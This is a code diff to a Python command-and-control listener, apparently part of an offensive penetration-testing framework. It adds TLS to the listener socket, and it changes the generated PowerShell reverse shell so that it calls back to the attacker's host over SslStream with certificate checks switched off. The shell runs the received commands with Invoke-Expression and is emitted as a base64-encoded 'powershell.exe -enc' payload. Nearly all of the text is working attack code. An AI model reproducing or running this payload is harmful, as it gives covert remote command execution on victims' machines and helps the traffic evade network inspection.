@@ -1,5 +1,6 @@
 #!/usr/bin/python
 import socket
+import ssl
 import random
 import re
 import sys
@@ -14,15 +15,16 @@ def startListener():
     try:
         time.sleep(0.25)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((FUNCTIONS().CheckInternet(), 5555))
-        s.listen(1)
+        ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, certfile="server.crt", keyfile="server.key", server_side=True)
+        ws.bind((FUNCTIONS().CheckInternet(), 5555))
+        ws.listen(5)
         print t.bold_red + "listening on port 5555" + t.normal
 
         startWorker = True
         clientnumber = 0
 
         while True:
-            clientconn, address = s.accept()
+            clientconn, address = ws.accept()
             ip , port = address
             if clientconn:
                 clientnumber += 1
@@ -35,18 +37,18 @@ def startListener():
 
             from menu import clientMenuOptions
             clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
-        s.close()
+        ws.close()
     except Exception as E:
-        s.close()
         print t.bold_red + "Error With Listener" + t.normal
         print E
 
 def interactShell(clientconn,clientnumber):
     from menu import clientMenuOptions
+    print "Commands\n" + "-"*24 + "\nback - Background Shell\nkill - Close Connection\n" + "-"*24
     while True:
         data = ''
         command = raw_input("PS >")
-        if command == "exit":
+        if command == "back":
             break
         if command == "kill":
             print t.bold_red + "Client Connection Killed" + t.normal
@@ -58,7 +60,7 @@ def interactShell(clientconn,clientnumber):
         clientconn.sendall(command)
         a = True
         while a:
-            data += clientconn.recv(16834).encode("utf-8").replace('\n','')
+            data += clientconn.recv(16834).encode("utf-8")
             if data[-1] == "\x00":
                 a = False
         print data
@@ -74,13 +76,16 @@ def clientUpload(fileToUpload,clientconn):
 def printListener():
     windows_ps_rev_shell = (
         "$client = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
-        "$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};"
-        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
+        "$stream = $client.GetStream();"
+        "[byte[]]$bytes = 0..65535|%{0};"
+        "$sslstream = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
+        "$sslstream.AuthenticateAsClient('10.131.101.65');"
+        "while(($i = $sslstream.Read($bytes, 0, $bytes.Length)) -ne 0)"
         "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
         "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String );"
         "$backres = $commandback + ($error[0] | Out-String) + \"\x00\";$error.clear();"
-        "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
-        "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
+        "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$sslstream.Write($sendbyte,0,$sendbyte.Length);"
+        "$sslstream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
     print 'powershell.exe -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
     return True
 
